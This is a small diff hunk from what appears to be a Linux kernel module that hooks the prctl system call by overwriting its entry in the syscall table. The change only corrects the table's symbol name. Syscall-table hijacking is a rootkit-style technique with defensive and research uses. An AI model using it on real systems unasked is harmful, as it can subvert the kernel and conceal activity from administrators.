@@ -20,7 +20,7 @@ int init_hijack(void){
     int ret;
     unsigned long oprctl;
 
-    oprctl = (unsigned long)&syscall_table[__NR_prctl];
+    oprctl = (unsigned long)&sys_call_table[__NR_prctl];
 
     orig_prctl = syscalltable_get_original(oprctl);
     ret = syscalltable_hook(oprctl,my_hook_prctl);
